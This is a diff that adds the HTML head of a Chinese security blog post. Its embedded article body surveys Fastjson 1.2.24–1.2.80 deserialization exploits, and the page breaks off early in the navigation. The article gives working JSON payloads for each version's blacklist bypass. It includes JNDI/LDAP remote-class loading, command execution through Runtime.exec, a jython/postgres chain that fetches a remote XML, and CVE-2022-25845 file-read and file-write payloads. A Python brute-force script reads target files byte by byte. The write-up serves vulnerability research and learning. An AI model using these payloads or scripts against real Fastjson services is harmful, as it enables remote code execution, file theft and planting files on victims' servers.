@@ -1,0 +1,1322 @@
+<!DOCTYPE html>
+<html lang="zh" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Fastjson1.2.24-1.2.80 反序列化 | Jiecub3</title>
+<meta name="keywords" content="">
+<meta name="description" content="做个总结，忘了捡得快 1.2.24~1.2.47 1.2.24-1.2.47（绕过黑名单的poc 都需开启autoTypeSupport 用于返回class，关闭throw">
+<meta name="author" content="Jiecub3">
+<link rel="canonical" href="https://Jiecub3.github.io/zh/posts/java/fastjson/fastjson1.2.24-1.2.80/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.6498a9db1bad4c0d045c3aa5ba217809694eb596cf8fff3516fcb871a2dfe03e.css" integrity="sha256-ZJip2xutTA0EXDqluiF4CWlOtZbPj/81Fvy4caLf4D4=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://Jiecub3.github.io/img/logo.gif">
+<link rel="icon" type="image/png" sizes="16x16" href="https://Jiecub3.github.io/img/logo.gif">
+<link rel="icon" type="image/png" sizes="32x32" href="https://Jiecub3.github.io/img/logo.gif">
+<link rel="apple-touch-icon" href="https://Jiecub3.github.io/logo.gif">
+<link rel="mask-icon" href="https://Jiecub3.github.io/logo.gif">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="zh" href="https://Jiecub3.github.io/zh/posts/java/fastjson/fastjson1.2.24-1.2.80/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><meta property="og:title" content="Fastjson1.2.24-1.2.80 反序列化" />
+<meta property="og:description" content="做个总结，忘了捡得快 1.2.24~1.2.47 1.2.24-1.2.47（绕过黑名单的poc 都需开启autoTypeSupport 用于返回class，关闭throw" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://Jiecub3.github.io/zh/posts/java/fastjson/fastjson1.2.24-1.2.80/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2025-06-01T20:01:23+08:00" />
+<meta property="article:modified_time" content="2025-06-01T20:01:23+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Fastjson1.2.24-1.2.80 反序列化"/>
+<meta name="twitter:description" content="做个总结，忘了捡得快 1.2.24~1.2.47 1.2.24-1.2.47（绕过黑名单的poc 都需开启autoTypeSupport 用于返回class，关闭throw"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://Jiecub3.github.io/zh/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Fastjson1.2.24-1.2.80 反序列化",
+      "item": "https://Jiecub3.github.io/zh/posts/java/fastjson/fastjson1.2.24-1.2.80/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Fastjson1.2.24-1.2.80 反序列化",
+  "name": "Fastjson1.2.24-1.2.80 反序列化",
+  "description": "做个总结，忘了捡得快 1.2.24~1.2.47 1.2.24-1.2.47（绕过黑名单的poc 都需开启autoTypeSupport 用于返回class，关闭throw",
+  "keywords": [
+    
+  ],
+  "articleBody": " 做个总结，忘了捡得快\n1.2.24~1.2.47 1.2.24-1.2.47（绕过黑名单的poc 都需开启autoTypeSupport 用于返回class，关闭throw\n1.2.24 两个常用poc，无过滤\nTemplatesImpl 反序列化\nJdbcRowSetImpl 反序列化\n1.2.25~1.2.41 增加了黑/白名单检测，但是再最后loadClass()时，会对我们传入的class进行L和;的截取再加载class （Lxxx;-\u003exxx）\n导致可以通过L;绕过前面的黑名单检测，最后加载时再截取及可以加载我们想要的class，从而绕过黑名单\nParserConfig.getGlobalInstance().setAutoTypeSupport(true); //开启autoTypeSupport {\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://127.0.0.1:1389/g0tvin\",\"autoCommit\":true} 1.2.42 在checkAutoType最开始时及会对class进行一次L;的截取，然后进行黑名单检测再loadClass()，但是这个截取只会进行一次，所以可以双写L;进行绕过，LLxxx;;\n// poc ParserConfig.getGlobalInstance().setAutoTypeSupport(true); //开启autoTypeSupport {\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"ldap://127.0.0.1:1389/g0tvin\",\"autoCommit\":true} 1.2.43 在此版本中,checkAutoType对LL进行了判断，如果类以LL开头，则直接抛出异常\n但是在loadClass()中除了L;的截取，会有对[开头的截取，所以我们用[进行绕过，但是直接用会存在报错，根据报错填上对应字符{即可\n// poc ParserConfig.getGlobalInstance().setAutoTypeSupport(true); //开启autoTypeSupport {\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{,\"dataSourceName\":\"ldap://127.0.0.1:1389/g0tvin\",\"autoCommit\":true} 1.2.44\n修复了[的绕过，在checkAutoType中进行判断如果类名以[开始则直接抛出异常 \u003c1.2.47(通杀!!!) 无需开启autoTypeSupport\n简述：通过Class.class对应的deserializer反序列化，实现恶意class的加载和map存储，然后再通过@type触发，从map中获取存储的class完成恶意class的获取，这个过程完全避免了autoType的黑白名单检测\n{ \"1\": { \"@type\": \"java.lang.Class\", \"val\": \"com.sun.rowset.JdbcRowSetImpl\" }, \"2\": { \"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\": \"ldap://127.0.0.1:1389/g0tvin\", \"autoCommit\": true } } 初始化时会给deserializers存入一些类型\n所下面这里会找到Class.class\n然后return class，再对对应的deserializer进行反序列化\n而deserialze()中会对val设置的值进行loadClass()\n并且加载成功会将其put到mappings中（cache默认就是true）,没错这里mappings就是getClassFromMapping()中获取的map，所以我们只需要再@type调用jdbc即可（这里因为是没开启autoTypeSupport，所以不会进入第一个for黑白名单检测，而通过getClassFromMapping()获取到class后，有if判断进行return class，不再进行后续代码，及实现了没有黑名单检测）\npublic static Class\u003c?\u003e getClassFromMapping(String className) { return (Class)mappings.get(className); } 1.2.48~1.2.68 1.2.48\n在MiscCodec中修改了cache的默认值，修改为false，并且对TypeUtils.loadClass中的mapping.put做了限制 在此版本中新增了一个safeMode功能，如果开启的话，将会直接抛出异常，完全杜绝了autoTypeSupport的绕过\n这里还存在一些黑名单绕过（需要开启autoTypeSupport\nhttps://www.anquanke.com/post/id/232774#h3-18\n1.2.67分析一条链子 https://www.anquanke.com/post/id/232774#h3-16\norg.apache.shiro.jndi.JndiObjectFactory 绕过黑名单 需要开启AutoTypeSupport（不然没地方加载class）\nParserConfig.getGlobalInstance().setAutoTypeSupport(true); String a67=\"{\\\"@type\\\":\\\"org.apache.shiro.jndi.JndiObjectFactory\\\",\\\"resourceName\\\":\\\"ldap://localhost:1389/Exploit\\\",\\\"instance\\\":{\\\"$ref\\\":\\\"$.instance\\\"}}\"; JSON.parse(a67); 这里通过setResourceName设置jndi恶意vps，然后getInstance触发jndi请求\n\"instance\":{}这里不能这样使用，因为public T getInstance() {返回值类型不继承自Collection.class Map AtomicBoolean AtomicInteger AtomicLong 这里T调试类型是java.lang.Object\n但是可以通$ref来触发，那么看看$ref是怎么处理的\n循环引用 $ref https://github.com/alibaba/fastjson/wiki/%E5%BE%AA%E7%8E%AF%E5%BC%95%E7%94%A8\n语法 描述 {\"$ref\":\"$\"} 引用根对象 {\"$ref\":\"@\"} 引用自己 {\"$ref\":\"..\"} 引用父对象 {\"$ref\":\"../..\"} 引用父对象的父对象 {\"$ref\":\"$.members[0].reportTo\"} 基于路径的引用 $ref在反序列化json时，会进行一些初始化设置值，便于后续调用\nvalue是反序列化完的对象，然后handleResovleTask进行ref的调用\n调用前，还会初始化一些fieldInfo，使一些本来不能调用方法，可以调用，比如这里是通过computeGetters初始getter方法的。但是这里就不限制返回值了，所以getInstance得以被添加\n这里满足长度\u003e=4,第四位数为大写基本上就可以添加到filedInfo里面了\n\"instance\":{\"$ref\":\"$.instance\"} 然后再通过$ref去获取{}(整个对象)下\"instance\"，从而触发获取对象的instance属性，及调用fieldInfo中对应的getter方法，获取instance值，触发getInstance得以利用\n\u003c1.2.68(expectClass 在不开启autoTypeSupport的情况下，还有一个点可以利用expectClass，加载恶意class后满足下面两个条件就能返回class\n传入expectClass不为null 恶意class继承expectClass 正常即使绕过黑名单也需要开启autoTypeSupport，保证class的返回\n具体利用查找 而正常调用，我们的expectClass都是null，所以我们可以查找checkAutoType其他地方的调用\nclazz = config.checkAutoType(typeName, null, lexer.getFeatures()); 发现有2处，且都是反序列化的时候调用，分别是JavaBeanDeserializer，ThrowableDeserializer\n及我们需要取看怎么获取这两个serializer，那就是去分析getDeserializer()呗，我们的expectClass不属于上面类时会进入到createJavaBeanDeserializer()，同时看到上方else if，expectClass继承与Throwable.class即可返回ThrowableDeserializer反序列化器\nelse if (Throwable.class.isAssignableFrom(clazz)) { derializer = new ThrowableDeserializer(this, clazz); 可以看到经过createJavaBeanDeserializer()一系列处理后，可以返回JavaBeanDeserializer反序列化器，后续则会调用\n然后这里json指针继续向后读取，key为@type时进入if，并读取值作为typeName传入config.checkAutoType(typeName, expectClass, lexer.getFeatures())；\n到这里就完成了expectClass的传入了，然后想要完成return只需要，继承于expectClass，且不是黑名单即可\nexpectClass查找 上面分析，我们知道怎么利用这个expectClass来加载我们恶意class了，但是还需要找到一个expectClass来return 自己的class，并进入到createJavaBeanDeserializer()\n无autoTypeSupport 首先无autoTypeSupport 完成 return class，及分析checkAutoType()逻辑\n可以看到无autoTypeSupport和expectClass，会先在mappings和deserializers查找然后返回class\nclazz = TypeUtils.getClassFromMapping(typeName); clazz = deserializers.findClass(typeName); 继续往下到第二次黑/白名单检测，使得autoTypeSupport为false也会进行waf检测，但是可以发现是白名单的话则会直接loadclass并返回class\n然后继续往下就还有最后一处，继承于JSONType.class也会return class\nif (clazz != null) { if (TypeUtils.getAnnotation(clazz,JSONType.class) != null) { return clazz; } 补充，高版本才有internalWhite，有个白名单，属于白名单的会加载，然后后面代码会return class\nif (internalWhite) { clazz = TypeUtils.loadClass(typeName, defaultClassLoader, true); } return 小结 总结下无autoTypeSupport可以return class的点\nMappings，deserializers\nTypeUtils.getClassFromMapping(typeName); clazz = deserializers.findClass(typeName); checkAutoType里白名单（默认为空\n继承JSONType.class\ninternalWhite 白名单\n怎么找 然后要找JavaBeanDeserializer的话，deserializers就可以排除了，因为他init没有put对应的JavaBeanDeserializer（ThrowableDeserializer有\nmappings在addBaseClassMappings()进行初始化，可以更直观看到哪些class可以利用\n然后看到Object.class这不是随便利用？（1.2.42前面看的代码逻辑）\n然后看了下1.2.67做了一些限制，expectClass不能是下方这些类，不然expectClassFlag = false;-\u003e不能加载和返回class（这样处理也是为了限制利用范围，因为下方继承类很多\nObject.class Serializable.class Cloneable.class Closeable.class EventListener.class Iterable.class Collection.class 然后1.2.67代码上相对于之前版本，并不会都进行loadClass()了，改为下方这种方式\nif (autoTypeSupport || jsonType || expectClassFlag) { //jsonType 就是继承JSONType.class boolean cacheClass = autoTypeSupport || jsonType; clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass); } 也就是从mappings和JSONType.class以及internalWhite 里找 expectClass\nEvil继承AutoCloseable就行\nString obj=\"{\\\"@type\\\":\\\"java.lang.AutoCloseable\\\"{\\\"@type\\\":\\\"Evil\\\",\\\"cmd\\\":\\\"calc\\\"}}\"; JSON.parseObject(obj); jdbc gadgets\n1.2.68小结 恶意类不在黑名单内 恶意类的父类（exceptClass例如AutoCloseable）不在黑名单内 且 要能本身能return class 并能获取JavaBeanDeserializerorThrowableDeserializer反序列化加载器 恶意类不能是抽象类 恶意类中的getter/setter/static block/constructor能触发恶意操作 修复 1.2.69新增了黑名单可以参考https://github.com/LeadroyaL/fastjson-blacklist\nAutoCloseable就被添加到黑名单了，所以后续去查找Throwable期望类的利用\n1.2.73~1.2.80 1.2.73的改动，允许对任意类型的field进行实例化，增加了攻击面。下面的利用即是通过这个特性\n下图是1.2.67的代码，可以看到是没有field进行实例化，而是直接获取json反序列化的结果\n利用原理 利用思路就在下图，通过**putDeserializer**将这3点地方存入deserializers缓存中，再次@type调用，即可直接获得class，而不会throw了\n参照y4扩展的一个demo\npublic class MyException extends Throwable { private MyClass clazz; public Evil evil; public void setClazz(MyClass clazz) { this.clazz = clazz; } public MyException(try1 trytry) { trytry.tryname=\"trytry\"; } public MyException() { } } public class MyClass { public String name; } public class try1 { public String tryname; } public class Evil implements AutoCloseable { private String cmd; public void setCmd(String cmd) throws Exception{ this.cmd = cmd; Runtime.getRuntime().exec(this.cmd); } } poc\nd这个地方是用于构造方法的参数类型获取，第一次可以去掉（因为无参和有参构造方法，默认会选择无参\n{ \"a\": { \"@type\": \"java.lang.Exception\", \"@type\": \"MyException\", \"trytry\": {}, \"clazz\": {}, \"evil\": {} }, \"b\": { \"@type\": \"MyClass\", \"name\": \"asd\" }, \"c\": { \"@type\": \"Evil\", \"cmd\": \"calc\" }, \"d\": { \"@type\": \"try1\", \"tryname\": \"tttttry\" } } 流程的话，直接到Exception获得ThrowableDeserializer并执行deserialze()这里吧\n然后这里会去一个for循环处理json中key的值做对应处理，\n@type则去加载对应类，这里就是MyException 然后是String进行下方判断，不是elseif中字符，则存储到otherValues中，（clazz，evil） 然后otherValues不为空，则会getDeserializer()获取上面的加载的class，而TypeUtils.cast这里就实例化filed，里面执行了putDeserializer（也就是利用思路的关键）\n这里还需要关注下exBeanDeser.getFieldDeserializer(key);这里，MyException只有 有参自构方法时，这里只会获取有参自构方法的参数类型，另外两种则不会获取（另外两种在无参自构时会获取）(下图需要将MyException无参自构方法注释\n跟进里面最后在castToJavaBean()中调用config.getDeserializer()-\u003eputDeserializer()，返回的反序列化加载器还会调用createInstance()进行反序列化，触发static和自构方法code\nputDeserializer()\n只有 有参构造方法的时候，会还原储存对应方法的参数类型\n无构造方法 or 存在无参自构方法时，会还原另外两种情况类型\nwhy public filed 这里要一直追随到fields的初始化，这里只会获取public 添加到list中\ngadget jdbc 依赖\ncom.alibaba fastjson 1.2.80 org.python jython 2.7.0 org.postgresql postgresql 42.3.1 org.springframework spring-context 5.3.28 参考的y4\n{ \"a\":{ \"@type\":\"java.lang.Exception\", \"@type\":\"org.python.antlr.ParseException\", \"type\":{} }, \"b\":{ \"@type\":\"org.python.core.PyObject\", \"@type\":\"com.ziclix.python.sql.PyConnection\", \"connection\":{ \"@type\":\"org.postgresql.jdbc.PgConnection\", \"hostSpecs\":[ { \"host\":\"127.0.0.1\", \"port\":2333 } ], \"user\":\"user\", \"database\":\"test\", \"info\":{ \"socketFactory\":\"org.springframework.context.support.ClassPathXmlApplicationContext\", \"socketFactoryArg\":\"http://127.0.0.1:8090/exp.xml\" }, \"url\":\"\" } } } 这个利用很猛啊\n流程：\nput Exception\n加载ParseException（expectClass：Exception\n触发ParseException#setType –\u003e put PyObject\n加载PyConnection（expectClass PyObject\n触发PyConnection自构方法 –\u003e put Connection //这里还没到调用自构方法那不，这里要先对值进行还原即\"connection\":{…}，而这里会先处理connection，所以加载PgConnection时，Connection 为expectClass\n加载PgConnection（expectClass Connection //PGConnection是另一个类，所以这里要利用Connection\n触发PgConnection自购方法 –\u003e jdbc rce\n那能不能这样构造呢，这样貌似更好理解，理论上是可以的，只是connection这个参数这个值为下面这个的话，PyConnection自购的时候会异常\n{ “a”:{… }, “b”:{…. “connection”:{} }, “c”:{ “@type”:“java.sql.Connection”, “@type”:“org.postgresql.jdbc.PgConnection”, … } }\n关于field进行实例化这个特性JavaBeanDeserializer同样存在，初始化完参数后PgConnection调用自购方法，触发jdbc\n修复 https://github.com/alibaba/fastjson/commit/35db4adad70c32089542f23c272def1ad920a60d https://github.com/alibaba/fastjson/commit/8f3410f81cbd437f7c459f8868445d50ad301f15 除了黑白名单的变化以外就是直接端掉异常类这条路。\n并且在加类缓存时多了一次autotype判断\nexpectClass和jsonType都需要开启\nCVE-2022-25845 https://github.com/luelueking/CVE-2022-25845-In-Spring\nhttps://i.blackhat.com/USA21/Wednesday-Handouts/US-21-Xing-How-I-Used-a-JSON.pdf\n这里用的@1ue师傅的poc，跟议会上的poc构造可能有点差异吧，不过利用点是一样的\n这个利用在1.2.80里我觉得是实用性很好的poc了，这里主要需要3个依赖吧\ncommons-io //用来读写文件 fastjson //不用多说，触发利用 springboot //这个其实是因为会启动时，会生成一个tomcat的临时目录，而TomcatEmbeddedWebappClassLoader加载Class时，会在上述目录对应路径下查找class文件，存在的话就会加载这个class文件触发static块代码执行 所以这三个依赖就造就这个amazing的利用\nput java.io.InputStream 便于后续的调用 因为tomcat这个目录名，并不是固定的，而是随机的，但是在java中file协议可以用来遍历目录所以这里我可以通过file:///tmp找到生成tomcat临时目录的名字 及写入构造好的class文件到tomcat临时目录下，且这个可以解决目录创建的问题 通过fastjson触发class加载，触发static{}执行 //这里fastjson加载类时，会用到TomcatEmbeddedWebappClassLoader加载，所以能加载tomcat临时目录的class。都是环环相扣的利用，挺有意思的 Step1: put java.io.InputStream { \"a\": \"{ \\\"@type\\\": \\\"java.lang.Exception\\\", \\\"@type\\\": \\\"com.fasterxml.jackson.core.exc.InputCoercionException\\\", \\\"p\\\": { } }\", \"b\": { \"$ref\": \"$.a.a\" }, \"c\": \"{ \\\"@type\\\": \\\"com.fasterxml.jackson.core.JsonParser\\\", \\\"@type\\\": \\\"com.fasterxml.jackson.core.json.UTF8StreamJsonParser\\\", \\\"in\\\": {}}\", \"d\": { \"$ref\": \"$.c.c\" } } 这里解释下poc构造写法吧，可以看到用的是\"a\":\"...\"这种而不是\"a\":{...}，为什么这样构造呢（测试两种poc都是能put成功的），感觉是微操(就是不报错，记录日志的时候是正常的，可以看到作者的poc是200，而通常的利用是500（如果明白这个特征找日志就很好定位\n200\n500\n$ref的利用 简述：通过parse.parse()会还原成一个map{String,String},然后parser.handleResovleTask(value);会去查找其中的$ref并进行调用，$.a很好理解就是获取到{“a”:\"…“对应的字符串，而$.a.a就是利用的关键，在寻找时会判断$.a的类型，是String的话会进行JSON.parse()反序列化其值，（正常情况是得到一个map然后再在这个map中获取$.a.{a}{}中这个值(这里是a)。而我们这JSON.parse()会catch（这里相关处理是{}跳过），然后后续处理也没赋上值–\u003e最后return null。$.a.a即是null，\nso：这里$.a.a可以是$.a.{任何值}，只是用来触发$.a的反序列化\nhandleResovleTask调用$ref\n第一次进入getPropertyValue()，查找$.a，当前currentObject对应整个json{“a”,…}(即$)\n第二次进入getPropertyValue()，查找$.a.a，currentObject对应$.a，JSON.parse()触发利用\nStep2：文件读取 getBom() 看这个之前可以先看看这篇，核心利用getBom()\nhttps://mp.weixin.qq.com/s/esjHYVm5aCJfkT6I1D0uTQ\n利用需要知道getBom()的返回值，然后浅蓝这里举例了几种可能的场景感觉挺不错的\n一处修改昵称name的功能，通过ref将getBom()的返回值赋予name，然后查看name值，判断读取内容\n同上，但是判断赋值为空时报错，不为空正常，布尔判断了\n没有上述这种好用的name观察点了，通过类型错误导致fastjson报错，根据报错判断，\"java.lang.String\"{\"$ref\":\"$.abc.BOM[0]\"}，null时不报错，比对成功时返回类型错误报错\n没有任何报错回显时，可以在类型判断后面增加一个dnslog，报错时异常导致后面的dnslog请求不了（但是实战的话感觉很鸡肋）\n不过这种思路在版本探测效果还不错，就是引用几个关键版本点形成的poc进行dnslog请求（具体可以看@su18总结的\n{ \"a\": { \"@type\": \"java.io.InputStream\", \"@type\": \"org.apache.commons.io.input.BOMInputStream\", \"delegate\": { \"@type\": \"org.apache.commons.io.input.BOMInputStream\", \"delegate\": { \"@type\": \"org.apache.commons.io.input.ReaderInputStream\", \"reader\": { \"@type\": \"jdk.nashorn.api.scripting.URLReader\", \"url\": \"file:///C:/Windows/win.ini\" }, \"charsetName\": \"UTF-8\", \"bufferSize\": \"1024\" }, \"boms\": [ { \"charsetName\": \"UTF-8\", \"bytes\": [59,32,102] } ] }, \"boms\": [ { \"charsetName\": \"UTF-8\", \"bytes\": [1] } ] }, \"b\": {\"$ref\":\"$.a.delegate\"} } 通过爆破比对位数据进行获取的\n在parse.parse()反序列化后，设置Response值时去获取BOM值，触发getBOM()，然后会和in(ReaderInputStream)读取到的值和原本设置的boms进行比对，全部一致则会返回其byte[]，否则返回null\n这也就能通过Response判断文件内容了\n但是其实没必要多套一层啊，本身就能通过$ref触发getBom()，且能返回对应回显\n{ \"a\": { \"@type\": \"java.io.InputStream\", \"@type\": \"org.apache.commons.io.input.BOMInputStream\", \"delegate\": { \"@type\": \"org.apache.commons.io.input.ReaderInputStream\", \"reader\": { \"@type\": \"jdk.nashorn.api.scripting.URLReader\", \"url\": \"file:///C:/Windows/win.ini\"//${file} }, \"charsetName\": \"UTF-8\", \"bufferSize\": \"1024\" }, \"boms\": [ { \"charsetName\": \"UTF-8\", \"bytes\": [59,32,102]//${data} } ] }, \"b\": {\"$ref\":\"$.a.BOM\"} } 因为需要爆破目录，手测有点麻烦，还是让ai写了个脚本\nfrom concurrent.futures import ThreadPoolExecutor import requests import sys session = requests.Session() def send_request(target_url, char_code): boundary = \"----WebKitFormBoundaryROOGnnZjMDt56Gw0\" headers = { \"Host\": \"127.0.0.1:8080\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\", \"Connection\": \"close\", \"Content-Type\": f\"multipart/form-data; boundary={boundary}\", } payload = ( f'--{boundary}\\r\\n' 'Content-Disposition: form-data; name=\"json\"\\r\\n\\r\\n' '{\\n' ' \"a\": {\\n' ' \"@type\": \"java.io.InputStream\",\\n' ' \"@type\": \"org.apache.commons.io.input.BOMInputStream\",\\n' ' \"delegate\": {\\n' ' \"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\\n' ' \"reader\": {\\n' ' \"@type\": \"jdk.nashorn.api.scripting.URLReader\",\\n' f' \"url\": \"{target_url}\"\\n' ' },\\n' ' \"charsetName\": \"UTF-8\",\\n' ' \"bufferSize\": \"1024\"\\n' ' },\\n' ' \"boms\": [\\n' ' {\\n' ' \"charsetName\": \"UTF-8\",\\n' f' \"bytes\": [{char_code}]\\n' ' }\\n' ' ]\\n' ' },\\n' ' \"b\": {\"$ref\":\"$.a.BOM\"}\\n' '}\\r\\n' f'--{boundary}--\\r\\n' ) try: response = session.post( \"http://127.0.0.1:8080/json\", headers=headers, data=payload, timeout=5 ) return response.text except Exception as e: print(f\"Error sending request: {e}\") return None common_codes = list(range(48, 58)) + list(range(65, 91)) + list(range(97, 123)) other_codes = [c for c in range(256) if c not in common_codes] ordered_codes = common_codes + other_codes # 优先常见字符，然后测试其他字符 def brute_force_chars(target_url): valid_chars = \"\" with ThreadPoolExecutor(max_workers=50) as executor: # 可根据网络情况调整线程数 while True: futures = {} for code in ordered_codes: full_code = valid_chars + str(code) futures[executor.submit(send_request, target_url, full_code)] = code found = False for future in futures: code = futures[future] try: response_text = future.result() if response_text and '\"b\":null' not in response_text: valid_chars += str(code) + \",\" print(valid_chars) found = True break except: continue if not found: bytes_list = [int(b) for b in valid_chars.split(\",\") if b.strip()] print(\"Final result:\", \"\".join(chr(b) for b in bytes_list)) exit(0) if __name__ == \"__main__\": # if len(sys.argv) != 2: # print(\"Usage: python exploit.py \") # print(\"Example: python exploit.py file:///C:/Windows/win.ini\") # sys.exit(1) # target_url = sys.argv[1] brute_force_chars(\"file:///C:/Users\") # brute_force_chars(target_url) 但是在window环境下感觉有点灾难，因为我本地环境下Temp的目录太多了，查看了翻代码希望达到.../Temp/tomcat.*匹配tomcat开头文件（无果）\nStep3: 写入文件 这里我加了几处charsetName，不然我环境会报错缺少charset Name\n{ \"a\": { \"@type\": \"java.io.InputStream\", \"@type\": \"org.apache.commons.io.input.AutoCloseInputStream\", \"in\": { \"@type\": \"org.apache.commons.io.input.TeeInputStream\", \"input\": { \"@type\": \"org.apache.commons.io.input.CharSequenceInputStream\", \"cs\": { \"@type\": \"java.lang.String\" \"1234\",//${shellcode} \"charset\": \"iso-8859-1\", \"bufferSize\": 4 //${size} }, \"branch\": { \"@type\": \"org.apache.commons.io.output.WriterOutputStream\", \"writer\": { \"@type\": \"org.apache.commons.io.output.LockableFileWriter\", \"file\": \"./test3\",//${filename} \"charsetName\": \"UTF-8\", \"charset\": \"iso-8859-1\", \"append\": true }, \"charsetName\": \"UTF-8\", \"charset\": \"iso-8859-1\", \"bufferSize\": 1024, \"writeImmediately\": true }, \"closeBranch\": true } }, \"b\": { \"@type\": \"java.io.InputStream\", \"@type\": \"org.apache.commons.io.input.ReaderInputStream\", \"reader\": { \"@type\": \"org.apache.commons.io.input.XmlStreamReader\", \"inputStream\": { \"$ref\": \"$.a\" }, \"httpContentType\": \"text/xml\", \"lenient\": false, \"defaultEncoding\": \"iso-8859-1\" }, \"charsetName\": \"iso-8859-1\", \"bufferSize\": 1024 }, \"c\": {} } 利用图\n利用调用如上，细说感觉也描述不出来，然后有几个点要说下\nLockableFileWriter file这里初始化时，会帮我们创建目录，一般情况下tomcat-docbase.xxx这个目录下是没有WEB-INF/classes,这个目录需要我们来创建，而这里LockableFileWriter直接解决了这个问题 poc 中 $ref \"@type\": \"org.apache.commons.io.input.XmlStreamReader\", \"inputStream\": { \"$ref\": \"$.a\" } 在XmlStreamReader初始化时，inputStream可以直接获取到$.a的值，而不不是等到反序列化完，在对$ref的那种调用\n最后一个即是写入文件的坑吧，我本地调试是一次最多写入**15**个字符，后续写入可以追加写入到文件里。但是我看@1ue的poc是20个，但是在我本地环境调试来看是不行的。 会调用2次TeeInputStream#read，第一次是用于写入，第二次是用于返回EOF达到close()文件的效果\n后面发现一次写入过多时，不仅没有字符写入，写入对应的文件也操作不了（怀疑是一直处于open状态了，没close），只能写入新的文件\n调试发现是没有进行close(),后续发现是跟getBOM()这里有关，注意这里的maxBomSize这个值是作为下方for的length。\n接着下图1in.read()这里读取每个值，超过4个值后回到下图2中获取对应的值，每次pos会+1。count则是我们写入字符的长度。这里我们需要进入fill()（里面后续会调用TeeInputStream#read进行close()关闭流）。而这里我们可以发现如果count这里超过**15，图1for走完pos最多为15就会导致进入不了fill()**，导致没有close()\n图1\n图2\n然后就是其实是需要调用两次getBOM()的，而$ref我猜测应该只能调用一次，而XmlStreamReader初始化正好能调用两次getBOM() Step4 加载class 看完感觉这个利用构造，细思极恐。挖掘去这个构造的佬太猛了!^!\nFeature(结论): 摘取于 https://vidar-team.feishu.cn/docx/KGRNdoGJHocjE1xOEdzcxHH1n9d\n关于getter和setter getter自动调用条件： 方法名长度大于4 非静态方法 以get开头且第四个字母为大写 无参数传入 返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong setter自动调用需要满足以下条件： 方法名长度大于4 非静态方法 返回值为void或者当前类 以set开头且第四个字母为大写 参数个数为1个 如果目标类中私有变量没有setter方法，但是在反序列化时仍想给这个变量赋值，则需要使用Feature.SupportNonPublicField参数 fastjson 在为类属性寻找getter/setter方法时，调用函数com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()方法，会忽略_ -字符串 fastjson 在反序列化时，如果Field类型为byte[]，将会调用com.alibaba.fastjson.parser.JSONScanner#bytesValue进行base64解码，在序列化时也会进行base64编码 版本探测 https://github.com/su18/hack-fastjson-1.2.80\n参考：\nhttps://vidar-team.feishu.cn/docx/KGRNdoGJHocjE1xOEdzcxHH1n9d\nhttps://www.anquanke.com/post/id/232774#h3-18\nhttps://github.com/luelueking/CVE-2022-25845-In-Spring\nhttps://tttang.com/archive/1579/#toc_1268\nhttps://github.com/LeadroyaL/fastjson-blacklist\nhttps://github.com/su18/hack-fastjson-1.2.80\nhttps://y4er.com/posts/fastjson-1.2.80/\nhttps://mp.weixin.qq.com/s/esjHYVm5aCJfkT6I1D0uTQ\n议会\nhttps://github.com/knownsec/KCon/blob/master/2022/Hacking%20JSON%E3%80%90KCon2022%E3%80%91.pdf\nhttps://i.blackhat.com/USA21/Wednesday-Handouts/US-21-Xing-How-I-Used-a-JSON.pdf\n",
+  "wordCount" : "9254",
+  "inLanguage": "zh",
+  "datePublished": "2025-06-01T20:01:23+08:00",
+  "dateModified": "2025-06-01T20:01:23+08:00",
+  "author":{
+    "@type": "Person",
+    "name": "Jiecub3"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://Jiecub3.github.io/zh/posts/java/fastjson/fastjson1.2.24-1.2.80/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Jiecub3",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://Jiecub3.github.io/img/logo.gif"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://Jiecub3.github.io/zh/" accesskey="h" title="Jiecub3 (Alt + H)">Jiecub3</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
